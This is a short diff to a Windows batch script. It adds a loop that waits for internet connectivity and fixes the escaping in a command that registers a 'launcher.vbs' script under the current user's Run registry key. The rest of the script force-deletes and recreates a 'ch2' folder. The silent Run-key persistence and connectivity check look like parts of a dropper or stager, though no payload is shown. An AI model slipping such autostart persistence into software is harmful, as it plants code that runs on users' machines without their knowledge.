@@ -1,5 +1,21 @@
+
+@echo off
+:checkInternet
+
+ping -n 1 8.8.8.8 >nul
+if %errorlevel% equ 0 (
+    goto end
+) else (
+    echo No internet
+    timeout /t 5 >nul
+    goto checkInternet
+)
+:end
+
+
+
 set ourdirectory=%cd%
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Launcher" /t REG_SZ /d "wscript.exe \"%ourdirectory%\\launcher.vbs\"" /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Launcher" /t REG_SZ /d "wscript.exe \"%ourdirectory%\launcher.vbs\"" /f
 rmdir /S /Q ch2
 mkdir ch2
 cd ch2
